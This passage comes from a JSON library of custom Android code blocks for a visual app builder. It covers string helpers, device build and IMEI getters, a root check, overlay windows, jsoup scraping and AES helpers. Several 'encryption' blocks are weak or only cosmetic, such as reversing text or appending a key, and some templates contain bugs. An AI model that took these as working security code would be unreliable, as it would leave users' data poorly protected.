blocks"},{"code":"%1$s\n%4$s\n%2$s\n%5$s\n%3$s","color":"#FF43A047","typeName":"","name":"add source directly 7","palette":"170","type":"e","spec":"add source directly 1 %s.inputOnly add sorce directly 2 %s.inputOnly add source directly 3 %s.inputOnly |put between 1 and two this blocks|","spec2":"|put between 2 and 3 this blocks|"},{"code":"","color":"#FF43A047","name":"Arab Ware Operator Blocks","typeName":"","palette":"170","type":"h","spec":"New Blocks By Arab Ware Channel"},{"code":"String.valueOf((long)(%1$s)).concat(String.valueOf((long)(%2$s)))","color":"#FF43A047","name":"Join and block 1","typeName":"","palette":"170","type":"s","spec":"join %d with %d"},{"code":"Double.parseDouble(String.valueOf((long)(%1$s)).concat(String.valueOf((long)(%1$s))))","color":"#FF43A047","name":"join and block 2","typeName":"","palette":"170","type":"d","spec":"join %d and %d"},{"code":"String.valueOf((long)(%1$s)).equals(String.valueOf((long)(%2$s)))","color":"#FF43A047","name":"if number equals number","typeName":"","palette":"170","type":"b","spec":"%d equals %d"},{"code":"(String.valueOf((long)(%1$s)).contains(String.valueOf((long)(%2$s))))","color":"#FF43A047","name":"if number contains number","typeName":"","palette":"170","type":"b","spec":"%d contains %d"},{"code":"(%1$s \u003d\u003d %2$s) || (%1$s \u003e %2$s)","color":"#FF43A047","name":"equal or more","typeName":"","palette":"170","type":"b","spec":"%d equals or more than %d"},{"code":"(%1$s \u003d\u003d %2$s) || (%1$s \u003c %2$s)","color":"#FF43A047","name":"equals or less","typeName":"","palette":"170","type":"b","spec":"%d equals or less than %d"},{"code":"Patterns.WEB_URL.matcher(%1$s).matches()","color":"#FF43A047","name":"is link","typeName":"","palette":"170","type":"b","spec":"%s is link"},{"code":"%1$s","color":"#FF43A047","name":"create if command","typeName":"","palette":"170","type":"b","spec":"write you own boolean command here %s.inputOnly "},{"code":"String.valueOf((long)(%1$s)).replace(String.valueOf((long)(%2$s)), String.valueOf((long)(%3$s)))","color":"#FF43A047","name":"replace 1","typeName":"","palette":"170","type":"s","spec":"replace number in %d replace all %d with %d "},{"code":"Double.parseDouble(String.valueOf((long)(%1$s)).replace(String.valueOf((long)(%2$s)), String.valueOf((long)(%3$s))))","color":"#FF43A047","name":"replace 2","typeName":"","palette":"170","type":"d","spec":"replace number %d  replace all %d with %d"},{"code":"%1$s \u003d %2$s;","color":"#FF43A047","name":"Boolean","typeName":"","palette":"170","type":" ","spec":"%m.varBool set boolean command %s.inputOnly  "},{"code":"%1$s","color":"#FF43A047","name":"boolean","typeName":"","palette":"170","type":"s","spec":"get %m.varBool"},{"code":"","color":"#FF9E9D24","name":"created by arab ware channel.....","typeName":"","palette":"171","type":"h","spec":"created by arab ware channel"},{"code":"(double) %1$s","color":"#FF9E9D24","name":"getDouble","typeName":"","palette":"171","type":"d","spec":"getDouble(Normal) from %d"},{"code":"(float) %1$s","color":"#FF9E9D24","name":"getFloat","typeName":"","palette":"171","type":"d","spec":"getFloat From %d"},{"code":"(int) %1$s","color":"#FF9E9D24","name":"getInteger","typeName":"","palette":"171","type":"d","spec":"getInt(Integer) From %d"},{"code":"(long) %1$s","color":"#FF9E9D24","name":"getLong","typeName":"","palette":"171","type":"d","spec":"getLong From %d"},{"code":"","color":"#FF1E88E5","name":"Added By ArabWare Team","typeName":"","palette":"172","type":"h","spec":"Added By ArabWare Team!! By Jawad Al Kharrati"},{"code":"%1$s.setText(Build.TYPE);","color":"#FF1E88E5","name":"Set text 1","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build type"},{"code":"%1$s.setText(Build.TAGS);","color":"#FF1E88E5","name":"set text 2","typeName":"","palette":"172","type":" ","spec":"set %m.textview as  build tags"},{"code":"%1$s.setText(Build.USER);","color":"#FF1E88E5","name":"Set text 3","typeName":"","palette":"172","type":" ","spec":"set %m.textview as  build user"},{"code":"%1$s.setText(Build.UNKNOWN);","color":"#FF1E88E5","name":"Set text 4","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build Unknown"},{"code":"%1$s.setText(Build.ID);","color":"#FF1E88E5","name":"Set text 5","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build ID"},{"code":"%1$s.setText(Build.PRODUCT);","color":"#FF1E88E5","name":"Set text 6","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build product"},{"code":"%1$s.setText(Build.DISPLAY);","color":"#FF1E88E5","name":"Set text 7","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build display"},{"code":"%1$s.setText(Build.FINGERPRINT);","color":"#FF1E88E5","name":"Set text 8","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build fingerprint"},{"code":" %1$s.setText(Build.CPU_ABI);","color":"#FF1E88E5","name":"Set text 9","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build CPU ABI"},{"code":" %1$s.setText(Build.HOST);","color":"#FF1E88E5","name":"Set text 10","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build Host"},{"code":"%1$s.setText(Build.HARDWARE);","color":"#FF1E88E5","name":"Set text 11","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build HardWare"},{"code":"%1$s.setText(Build.SERIAL);","color":"#FF1E88E5","name":"Set text 12","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build  Serial"},{"code":"%1$s.setText(Build.RADIO);","color":"#FF1E88E5","name":"Set text 13","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build Radio "},{"code":" %1$s.setText(Build.BOOTLOADER);","color":"#FF1E88E5","name":"Set text 14","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build BootLoader"},{"code":"%1$s.setText(Build.BOARD);","color":"#FF1E88E5","name":"Set text 15","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build Board "},{"code":"%1$s.setText(Build.VERSION.SECURITY_PATCH);","color":"#FF1E88E5","name":"Set text 16","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build  Security Patch"},{"code":"%1$s.setText(Build.BRAND);","color":"#FF1E88E5","name":"Set text 17","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build Brand"},{"code":"%1$s.setText(Build.VERSION.SDK);","color":"#FF1E88E5","name":"Set text 18","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build version sdk"},{"code":"%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","color":"#FF1E88E5","name":"Set text 19","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build model"},{"code":"%1$s.setText(Build.VERSION.RELEASE);","color":"#FF1E88E5","name":"Set text 20","typeName":"","palette":"172","type":" ","spec":"set %m.textview as build release"},{"code":"%1$s.setText(Locale.getDefault().getDisplayLanguage());","color":"#FF1E88E5","name":"Set text 21","typeName":"","palette":"172","type":" ","spec":"set %m.textview as device language"},{"code":"Build.TYPE","color":"#FF1E88E5","name":"1","typeName":"","palette":"172","type":"s","spec":"get build type"},{"code":"Build.TAGS","color":"#FF1E88E5","name":"2","typeName":"","palette":"172","type":"s","spec":"get build tags"},{"code":"Build.USER","color":"#FF1E88E5","name":"3","typeName":"","palette":"172","type":"s","spec":"get build user"},{"code":"Build.UNKNOWN","color":"#FF1E88E5","name":"4","typeName":"","palette":"172","type":"s","spec":"get build Unknown"},{"code":"Build.ID","color":"#FF1E88E5","name":"5","typeName":"","palette":"172","type":"s","spec":"get build id"},{"code":"Build.PRODUCT","color":"#FF1E88E5","name":"6","typeName":"","palette":"172","type":"s","spec":"get build product"},{"code":"Build.DISPLAY","color":"#FF1E88E5","name":"7","typeName":"","palette":"172","type":"s","spec":"get build display"},{"code":"Build.FINGERPRINT","color":"#FF1E88E5","name":"8","typeName":"","palette":"172","type":"s","spec":"get build fimgerprint"},{"code":"Build.CPU_ABI","color":"#FF1E88E5","name":"9","typeName":"","palette":"172","type":"s","spec":"get build CPU ABI"},{"code":"Build.HOST","color":"#FF1E88E5","name":"10","typeName":"","palette":"172","type":"s","spec":"get build host"},{"code":"Build.HARDWARE","color":"#FF1E88E5","name":"11","typeName":"","palette":"172","type":"s","spec":"get build hardware"},{"code":"Build.SERIAL","color":"#FF1E88E5","name":"12","typeName":"","palette":"172","type":"s","spec":"get  build serial"},{"code":"Build.RADIO","color":"#FF1E88E5","name":"13","typeName":"","palette":"172","type":"s","spec":"get build radio"},{"code":"Build.BOOTLOADER","color":"#FF1E88E5","name":"14","typeName":"","palette":"172","type":"s","spec":"get build  bootloader"},{"code":"Build.BOARD","color":"#FF1E88E5","name":"15","typeName":"","palette":"172","type":"s","spec":"get build board"},{"code":"Build.VERSION.SECURITY_PATCH","color":"#FF1E88E5","name":"16","typeName":"","palette":"172","type":"s","spec":"get build security patch"},{"code":"Build.BRAND","color":"#FF1E88E5","name":"17","typeName":"","palette":"172","type":"s","spec":"get build brand"},{"code":"Build.VERSION.SDK","color":"#FF1E88E5","name":"18","typeName":"","palette":"172","type":"s","spec":"get build sdk"},{"code":"Build.MANUFACTURER.concat(\" \".concat(Build.MODEL))","color":"#FF1E88E5","name":"19","typeName":"","palette":"172","type":"s","spec":"get build model"},{"code":"Build.VERSION.RELEASE","color":"#FF1E88E5","name":"20","typeName":"","palette":"172","type":"s","spec":"get build release"},{"code":"Locale.getDefault().getDisplayLanguage()","color":"#FF1E88E5","name":"21","typeName":"","palette":"172","type":"s","spec":"get device language"},{"code":"PatternLockUtils.patternToString(%s, %s)","name":"patternToString","palette":"173","type":"s","spec":"%m.patternview getPattern from %m.listStr to String "},{"code":"PatternLockUtils.patternToMD5(%s, %s)","name":"patternToMD5","palette":"173","type":"s","spec":"%m.patternview getPattern from %m.listStr to MD5"},{"code":"PatternLockUtils.patternToSha1(%s, %s)","name":"patternToSha1","palette":"173","type":"s","spec":"%m.patternview getPattern from %m.listStr to SHA1"},{"code":"%s.setDotCount((int)%s);","name":"setDotCount","palette":"173","type":" ","spec":"%m.patternview setDotCount %d "},{"code":"%s.setDotNormalSize((int)%s);","name":"setDotNormalSize","palette":"173","type":" ","spec":"%m.patternview setDotNormalSize %d "},{"code":"%s.setDotSelectedSize((int)%s);","name":"setDotSelectedSize","palette":"173","type":" ","spec":"%m.patternview setDotSelectedSize %d "},{"code":"%s.setPathWidth((int)%s);","name":"setPathWidth","palette":"173","type":" ","spec":"%m.patternview setPathWidth %d"},{"code":"%s.setDotAnimationDuration((int)%s);","name":"setDotAnimationDuration","palette":"173","type":" ","spec":"%m.patternview setDotAnimationDuration %d"},{"code":"%s.setPathEndAnimationDuration((int)%s);","name":"setEndAnimationDuration","palette":"173","type":" ","spec":"%m.patternview setEndAnimationDuration %d"},{"code":"%s.setAspectRatioEnabled(%s);","name":"setAspectRatioEnabled","palette":"173","type":" ","spec":"%m.patternview setAspectRatioEnabled %b"},{"code":"%s.setInStealthMode(%s);","name":"setInStealthMode","palette":"173","type":" ","spec":"%m.patternview setInStealthMode %b"},{"code":"%s.setTactileFeedbackEnabled(%s);","name":"setTactileFeedbackEnabled","palette":"173","type":" ","spec":"%m.patternview setTactileFeedbackEnabled %b"},{"code":"%s.setInputEnabled(%s);","name":"setInputEnabled","palette":"173","type":" ","spec":"%m.patternview setInputEnabled %b"},{"code":"%s.setNormalStateColor(%s);","name":"setNormalStateColor","palette":"173","type":" ","spec":"%m.patternview setNormalStateColor %m.color"},{"code":"%s.setCorrectStateColor(%s);","name":"setCorrectStateColor","palette":"173","type":" ","spec":"%m.patternview setCorrectStateColor %m.color"},{"code":"%s.setWrongStateColor(%s);","name":"setWrongStateColor","palette":"173","type":" ","spec":"%m.patternview setWrongStateColor %m.color"},{"code":"%s.setViewMode(PatternLockView.PatternViewMode.%s);","name":"setPatternViewMode","palette":"173","type":" ","spec":"%m.patternview setViewMode %m.patternviewmode"},{"code":"%s.setAspectRatio(PatternLockView.AspectRatio.%s);","name":"setPatternAspectRation","palette":"173","type":" ","spec":"%m.patternview setAspectRatio %m.patternaspectratio"},{"code":"%s.clearPattern();","name":"clearPattern","palette":"173","type":" ","spec":"%m.patternview clearPattern"},{"code":"","color":"#FFF9A825","name":"azhar zouhir credit jsoup","typeName":"","palette":"174","type":"h","spec":"this blocks made by azhar zouhir"},{"code":"doc%s","color":"#FFF9A825","name":"doc","typeName":"","palette":"174","type":"s","spec":"doc %s.inputOnly"},{"code":"data_%s","color":"#FFF9A825","name":"data","typeName":"","palette":"174","type":"s","spec":"data %s.inputOnly"},{"code":"//this code written by azhar zouhir\norg.jsoup.nodes.Document %s \u003d org.jsoup.Jsoup.connect(%s);","color":"#FFF9A825","name":"Jsoup Connect","typeName":"","palette":"174","type":" ","spec":"Jsoup doc %s connect %s "},{"code":"//this code written by azhar zouhir\norg.jsoup.nodes.Document %s \u003d org.jsoup.Jsoup.parse(%s);","color":"#FFF9A825","name":"Jsoup Parse","typeName":"","palette":"174","type":" ","spec":"Jsoup doc %s  parse %s"},{"code":"//this code written by azhar zouhir\norg.jsoup.select.Elements %s \u003d %s.select(%s);","color":"#FFF9A825","name":"Elements select","typeName":"","palette":"174","type":" ","spec":"Elements data: %s doc %s select %s"},{"code":"//this code written by azhar zouhir\norg.jsoup.select.Elements %s \u003d %s.getElementsByClass(%s);","color":"#FFF9A825","name":"Elements getElementsByClass","typeName":"","palette":"174","type":" ","spec":"Elements data: %s doc %s getElementsByClass %s"},{"code":"","color":"#FFF9A825","name":"jsoup loops","typeName":"","palette":"174","type":"h","spec":"jsoup loops"},{"code":"for (org.jsoup.nodes.Element links : %1$s) {\n%2$s.add(links.text());\n}","color":"#FFF9A825","name":"loop text","typeName":"","palette":"174","type":" ","spec":"data: %s extract text to %m.listStr"},{"code":"for (org.jsoup.nodes.Element links : %1$s) {\n%3$s.add(links.attr(%2$s));\n}","color":"#FFF9A825","name":"loop attr","typeName":"","palette":"174","type":" ","spec":"data: %s attr %s add to %m.listStr"},{"code":"appUpdateManager \u003d AppUpdateManagerFactory.create(%1$s.this);  \n     appUpdateManager.getAppUpdateInfo().addOnSuccessListener(new OnSuccessListener\u003cAppUpdateInfo\u003e() {  \n       @Override  \n       public void onSuccess(AppUpdateInfo result) {  \n         if((result.updateAvailability() \u003d\u003d UpdateAvailability.UPDATE_AVAILABLE)  \n           \u0026\u0026 result.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE))  \n         {  \n           try {  \n             appUpdateManager.startUpdateFlowForResult(  \n                 result,  \n                 AppUpdateType.IMMEDIATE,  \n                 %1$s.this,  \n                 RequestUpdate);  \n             }  \n           catch (IntentSender.SendIntentException e)  \n           {  \n             e.printStackTrace();  \n           }  \n         }  \n       }  \n     });  ","color":"#FF0097A7","name":"IN APP UPDATE ON_CREATE","typeName":"","palette":"175","type":" ","spec":"IN APP UPDATE ON_CREATE AT  %m.activity "},{"code":"appUpdateManager.getAppUpdateInfo().addOnSuccessListener(new OnSuccessListener\u003cAppUpdateInfo\u003e() {  \n       @Override  \n       public void onSuccess(AppUpdateInfo result) {  \n         if(result.updateAvailability() \u003d\u003d UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS)  \n         {  \n           try {  \n             appUpdateManager.startUpdateFlowForResult(  \n                 result,  \n                 AppUpdateType.IMMEDIATE,  \n                 %1$s.this,  \n                 RequestUpdate);  \n           }  \n           catch (IntentSender.SendIntentException e)  \n           {  \n             e.printStackTrace();  \n           }  \n         }  \n       }  \n     });  ","color":"#FF0097A7","name":"IN  APP UPDATE ON_RESUME","typeName":"","palette":"175","type":" ","spec":"IN APP UPDATE ON_RESUME AT  %m.activity"},{"code":"","color":"#FF03A9F4","name":"ArabWare  ","typeName":"","palette":"176","type":"h","spec":"created by arab ware channel"},{"code":"try{\n%s\n}catch(Exception e){\n%s\n}","color":"#FF03A9F4","typeName":"","name":"Try","palette":"176","type":"e","spec":"Try","spec2":"If there is problem then"},{"code":"android.content.pm.PackageManager %1$s \u003d getPackageManager();\ntry { %1$s.getPackageInfo(%2$s, android.content.pm.PackageManager.GET_ACTIVITIES);\n%3$s\nreturn;\n} catch (android.content.pm.PackageManager.NameNotFoundException e) { } %4$s","color":"#FF03A9F4","typeName":"","name":"AppIfInstalledCheck","palette":"176","type":"e","spec":"create listener %m.package If there is app installed with package name %s then","spec2":"else"},{"code":"if (getApplicationContext().getPackageName().equals(%1$s)) {\r\n\t\r%2$s\n}\r\nelse {\r\n\t\r%3$s\n}","color":"#FF03A9F4","typeName":"","name":"package name","palette":"176","type":"e","spec":"If package name of this app equals %s then","spec2":"esle"},{"code":"android.content.pm.PackageManager %1$s \u003d getPackageManager();\r\nfinal String %1$sS \u003d %1$s.getInstallerPackageName(getPackageName());\r\nif (\"com.android.vending\".equals(%1$sS)) {\r\n%2$s\n}\r\nelse {\r\n%3$s\n}","color":"#FF03A9F4","typeName":"","name":"If App Installed From Play Store","palette":"176","type":"e","spec":"%m.package if this app installed from play store then","spec2":"else"},{"code":"android.content.pm.PackageManager %1$s \u003d getPackageManager();\r\nfinal String %1$sS \u003d %1$s.getInstallerPackageName(%2$s);\r\nif (\"com.android.vending\".equals(%1$sS)) {\r\n%3$s\n}\r\nelse {\r\n%4$s\n}","color":"#FF03A9F4","typeName":"","name":"check if app installed from play store","palette":"176","type":"e","spec":"%m.package if app with package name %s installed from play store then","spec2":"else"},{"code":"final android.net.wifi.WifiManager %1$s \u003d (android.net.wifi.WifiManager)getSystemService(Context.WIFI_SERVICE);\n\nif (%1$s.isWifiEnabled()) {\n    %2$s\n} else {\n    %3$s\n}","color":"#FF03A9F4","typeName":"","name":"Wi-Fi","palette":"176","type":"e","spec":"%m.requestnetwork If Wi-Fi Opened Then","spec2":"Else"},{"code":"try {\n\nRuntime.getRuntime().exec(\"su\"); \n\n%s\n\n} catch (Exception e ) {\n\n%s\n\n}","color":"#FF03A9F4","typeName":"","name":"RootChecker","palette":"176","type":"e","spec":"If device Rooted Then","spec2":"Else"},{"code":"if (SketchwareUtil.getDisplayWidthPixels(getApplicationContext()) \u003d\u003d %s) {\r\n\t\r%s\n}","color":"#FF03A9F4","name":"Screen Width","typeName":"","palette":"176","type":"c","spec":"If Screen width is %d then"},{"code":"if (SketchwareUtil.getDisplayHeightPixels(getApplicationContext()) \u003d\u003d %s) {\r\n\t\r%s\n}","color":"#FF03A9F4","name":"Screen Height","typeName":"","palette":"176","type":"c","spec":"If Screen Height is %d"},{"code":"try{\nint count;\njava.io.InputStream input\u003d this.getAssets().open(%s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%s+%s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n%s\n\t}catch(Exception e){\n\t\t\r%s\n\t}","color":"#FF03A9F4","typeName":"","name":"Assets Save","palette":"176","type":"e","spec":"Try To Save File From Assets With Name %s into path %s with name %s #If successed then","spec2":"Else"},{"code":"//%1$s\nif (SketchwareUtil.isConnected(getApplicationContext())) {\r\n\t%2$s\n}\r\nelse {\r\n\t%3$s\n}","color":"#FF03A9F4","typeName":"","name":"if connected","palette":"176","type":"e","spec":" %m.requestnetwork if device connected then","spec2":"else"},{"code":"if (FileUtil.isExistFile(%s)) {\r\n\t\r%s\n}\r\nelse {\r\n\t\r%s\n}\r","color":"#FF03A9F4","typeName":"","name":"FileCheck","palette":"176","type":"e","spec":"Check If there is file or folder in device #the path is %s","spec2":"Else"},{"code":"ActionBarDrawerToggle _toggle \u003d new ActionBarDrawerToggle(ac, _drawer, _toolbar, R.string.apptitle, R.string.apptitle) {\npublic void onDrawerClosed(View view) {\n%s\n}\n@Override\npublic void onDrawerSlide(View drawerView, float offset) {\n%s\n}\n};\n_drawer.addDrawerListener(_toggle);","color":"#FF03A9F4","typeName":"","name":"Drawer","palette":"176","type":"e","spec":"If drawer closed listener Then","spec2":"Else It opened"},{"code":"Rect rectangle \u003d new Rect();\nWindow window \u003d ac0.getWindow(); window.getDecorView().getWindowVisibleDisplayFrame(rectangle);\nint statusBarHeight \u003d rectangle.top;\nif  (statusBarHeight !\u003d 0) {\n%s\n}\nelse {\n%s\n}","color":"#FF03A9F4","typeName":"","name":"StatusBar","palette":"176","type":"e","spec":"If Status Bar Is Visible Ehen","spec2":"Else"},{"code":"Rect rectangle \u003d new Rect();\nDisplayMetrics displayMetrics \u003d new DisplayMetrics(); ac0.getWindow().getDecorView().getWindowVisibleDisplayFrame(rectangle); ac0.getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);\nif (displayMetrics.heightPixels !\u003d (rectangle.top + rectangle.height())) {\n%s\n}\nelse {\n%s\n}","color":"#FF03A9F4","typeName":"","name":"Navigation","palette":"176","type":"e","spec":"If Navigation Bar avaible then","spec2":"else"},{"code":"while(%1$s){\n%2$s\n}","color":"#FF03A9F4","name":"While","typeName":"","palette":"176","type":"c","spec":"While %b then"},{"code":"","color":"#FF0097A7","name":"Developed By Arab Ware Channel","typeName":"","palette":"177","type":"h","spec":"Developed By Arab Ware Channel"},{"code":"%1$s","color":"#FF0097A7","name":"Component Floating Window 2","typeName":"FloatWindowFix","palette":"177","type":"v","spec":"FloatingWindow2 %s.inputOnly"},{"code":"","color":"#FF0097A7","name":"PUT These Blocks!","typeName":"","palette":"177","type":"h","spec":"Please Put These Blocks Into On Show Event"},{"code":"LayoutInflater %1$sL \u003d LayoutInflater.from(this);","color":"#FF0097A7","name":"create layout inflater","typeName":"","palette":"177","type":" ","spec":"create layout inflater %m.FloatWindowFix"},{"code":"%1$sV \u003d %1$sL.inflate(R.layout.%2$s, null);","color":"#FF0097A7","name":"DisplayView","typeName":"","palette":"177","type":" ","spec":"%m.FloatWindowFix Set %m.customViews"},{"code":"%1$sV.setOnTouchListener(new FloatingOnTouchListener());","color":"#FF0097A7","name":"Create Listener","typeName":"","palette":"177","type":" ","spec":"%m.FloatWindowFix Create OnTouch Listener"},{"code":"final %2$s %4$s  \u003d %1$sV.findViewById(R.id.%3$s);","color":"#FF0097A7","name":"CreateView","typeName":"","palette":"177","type":" ","spec":"%m.FloatWindowFix Create View Type %m.typeview Find By Its ID %s.inputOnly with new ID %s.inputOnly"},{"code":"%2$s\n%1$s.addView(%1$sV, %1$sLP);","color":"#FF0097A7","name":"Events Here","typeName":"","palette":"177","type":"c","spec":"%m.FloatWindowFix Put Here All Events"},{"code":"","color":"#FF0097A7","name":"Please Put These Blocks !","typeName":"","palette":"177","type":"h","spec":"Please Put These Blocks Into On Touch Event"},{"code":"%1$sLP.x \u003d %1$sLP.x + movedX;\n%1$sLP.y \u003d %1$sLP.y + movedY;\n%1$s.updateViewLayout(view, %1$sLP);","color":"#FF0097A7","name":"OnTouch","typeName":"","palette":"177","type":" ","spec":"%m.FloatWindowFix On Touch |!Put It Into On Touch Of FloatWindowFix|"},{"code":"","color":"#FF0097A7","name":"Please Put These Blocks Into On Close Event","typeName":"","palette":"177","type":"h","spec":"Please Put These Blocks Into On Close Event"},{"code":"%1$s.removeView(%1$sV);","color":"#FF0097A7","name":"OnClose","typeName":"","palette":"177","type":" ","spec":"%m.FloatWindowFix |!Put This Into On Close Of FloatWindowFix|"},{"code":"","color":"#FF0097A7","name":"Please Put These Blocks Into On Create Event","typeName":"","palette":"177","type":"h","spec":"Please Put These Blocks Into On Create Event"},{"code":"%1$s \u003d (WindowManager) getSystemService(WINDOW_SERVICE);\n\n%1$sLP \u003d new WindowManager.LayoutParams();\n\n\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n\t\n\t%1$sLP.type \u003d WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;\n\t\n} else {\n\t\n\t%1$sLP.type \u003d WindowManager.LayoutParams.TYPE_PHONE;\n\t\n}\n\n\r\n%1$sLP.format \u003d PixelFormat.RGBA_8888;\n\n%1$sLP.gravity \u003d Gravity.LEFT | Gravity.TOP;\n\n%1$sLP.flags \u003d WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;\n\n%1$sLP.width \u003d %2$s;\n%1$sLP.height \u003d %3$s;\n\n%1$sLP.x \u003d 0;\n%1$sLP.y \u003d 0;\n\n","color":"#FF0097A7","name":"Library","typeName":"","palette":"177","type":" ","spec":"Install Floating window Library %m.FloatWindowFix with width %d with hieght %d"},{"code":"","color":"#FF0097A7","name":"Extra Blocks","typeName":"","palette":"177","type":"h","spec":"Extra Blocks"},{"code":"android.provider.Settings.canDrawOverlays(%s.this)","color":"#FF0097A7","name":"canDrawOverlays2","typeName":"","palette":"177","type":"b","spec":"%m.activity canDrawOverlays"},{"code":"%1$s \u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,\nUri.parse(\"package:\" + getPackageName()));\nstartActivity(%1$s);","color":"#FF0097A7","name":"getPermissionOverlay2","typeName":"","palette":"177","type":" ","spec":"%m.intent getOverLayPermission"},{"code":"showFloatingWindow();","color":"#FF0097A7","name":"showFloatingWindow2","typeName":"","palette":"177","type":" ","spec":"Show Floating Window"},{"code":"closes();","color":"#FF0097A7","name":"closeWindow2","typeName":"","palette":"177","type":"f","spec":"closeWindow"},{"code":"","color":"#FFD81B60","name":"created by ArabWare Channel","typeName":"","palette":"179","type":"h","spec":"Created By Arab Ware Channel"},{"code":"%1$s.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {\r\n\t@Override\r\n\tpublic void onRefresh() {\r\n\t\t \r%2$s\n\t}\r\n});","color":"#FFD81B60","name":"on refresh","typeName":"","palette":"179","type":"c","spec":"%m.swiperefreshlayout set on refresh"},{"code":"%1$s.setRefreshing(%2$s);","color":"#FFD81B60","name":"set refreshing","typeName":"","palette":"179","type":" ","spec":"%m.swiperefreshlayout set refreshing %b"},{"code":"","color":"#FF0091EA","name":"by ","typeName":"","palette":"180","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"%1$s \u003d (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);\r","color":"#FF0091EA","name":"put me at on create","typeName":"","palette":"180","type":" ","spec":"%m.TelephonyManager create new one in on create"},{"code":"%1$s.getDeviceId()","color":"#FF0091EA","name":"get IMEI","typeName":"","palette":"180","type":"s","spec":"%m.TelephonyManager get IMEI"},{"code":"","color":"#FF2196F3","name":"ArabWare","typeName":"","palette":"181","type":"h","spec":"created by arab ware channel"},{"code":"}\npublic String EcryptingTheTextMethod(final String _string, final String _key) {\r\n\t\ttry{\njavax.crypto.SecretKey key \u003d generateKey(_key);\njavax.crypto.Cipher c \u003d javax.crypto.Cipher.getInstance(\"AES\");\nc.init(javax.crypto.Cipher.ENCRYPT_MODE, key);\nbyte[] encVal \u003d c.doFinal(_string.getBytes());\nreturn android.util.Base64.encodeToString(encVal,android.util.Base64.DEFAULT);\r\r\n\t\t} catch (Exception e) {\r\n\t\t}\r\nreturn \"\";\n\t}\n\n\tpublic String DecryptingTheTextMethod(final String _string, final String _key) {\r\n\t\ttry {\njavax.crypto.spec.SecretKeySpec key \u003d (javax.crypto.spec.SecretKeySpec) generateKey(_key);\njavax.crypto.Cipher c \u003d javax.crypto.Cipher.getInstance(\"AES\");\nc.init(javax.crypto.Cipher.DECRYPT_MODE,key);\nbyte[] decode \u003d android.util.Base64.decode(_string,android.util.Base64.DEFAULT);\nbyte[] decval \u003d c.doFinal(decode);\nreturn new String(decval);\r\n\t\t} catch (Exception ex) {\r\n\t\t}\nreturn \"\";\n\t}\n\tpublic static javax.crypto.SecretKey generateKey(String pwd) throws Exception {\nfinal java.security.MessageDigest digest \u003d java.security.MessageDigest.getInstance(\"SHA-256\");\nbyte[] b \u003d pwd.getBytes(\"UTF-8\");\ndigest.update(b,0,b.length);\nbyte[] key \u003d digest.digest();\njavax.crypto.spec.SecretKeySpec sec \u003d new javax.crypto.spec.SecretKeySpec(key, \"AES\");\nreturn sec;\r\n\t}\r\n{","color":"#FF2196F3","name":"external......","typeName":"","palette":"181","type":" ","spec":"put me at more block بلوك مور في ضعني"},{"code":"EcryptingTheTextMethod(%1$s,%2$s)","color":"#FF2196F3","name":"encryptText....","typeName":"","palette":"181","type":"s","spec":"AES get encrypted text from %s by key %s"},{"code":"DecryptingTheTextMethod(%1$s,%2$s);","color":"#FF2196F3","name":"get decrypted text ....","typeName":"","palette":"181","type":"s","spec":"AES get decrypted text from %s by key %s"},{"code":"","color":"#FF2196F3","name":"map variable encryption-decryption","typeName":"","palette":"181","type":"h","spec":"map variable encryption-decryption"},{"code":"%1$s.put(%2$s, String.valueOf((long)(3)).concat(%4$s));\r","color":"#FF2196F3","name":"set map variable","typeName":"","palette":"181","type":" ","spec":"set %m.varMap as with key %s with value %d with encryption key %s "},{"code":"%1$s.put(%2$s, String.valueOf((long)(Double.parseDouble(map.get(%2$s).toString().replace(%3$s, \"\")) + %4$s)).concat(%3$s));","color":"#FF2196F3","name":"increase map variable","typeName":"","palette":"181","type":" ","spec":"increase encrypted %m.varMap with key %s with encryption key %s increase + %d"},{"code":"%1$s.put(%2$s, String.valueOf((long)(Double.parseDouble(y.get(%2$s).toString().replace(%3$s, \"\")) - %4$s)).concat(%3$s));","color":"#FF2196F3","name":"decrease map variable","typeName":"","palette":"181","type":" ","spec":"decrease encrypted %m.varMap with key %s with encryption key %s decrease - %d"},{"code":"String.valueOf((long)(Double.parseDouble(%1$s.get(%2$s).toString().replace(%3$s, \"\")) + 0))","color":"#FF2196F3","name":"map variable get","typeName":"","palette":"181","type":"d","spec":"get decrypted %m.varMap with key %s with decryption key %s"},{"code":"","color":"#FF2196F3","name":"genius encrypt","typeName":"","palette":"181","type":"h","spec":"genius encryption"},{"code":"new StringBuilder(%s).reverse().toString()","color":"#FF2196F3","name":"reverse text","typeName":"","palette":"181","type":"s","spec":"get %s as reverse text"},{"code":"String text \u003d %1$s;\nbyte[] bytes \u003d text.getBytes();\nStringBuilder binary \u003d new StringBuilder();\n\nfor (byte b : bytes) {\n   int val \u003d 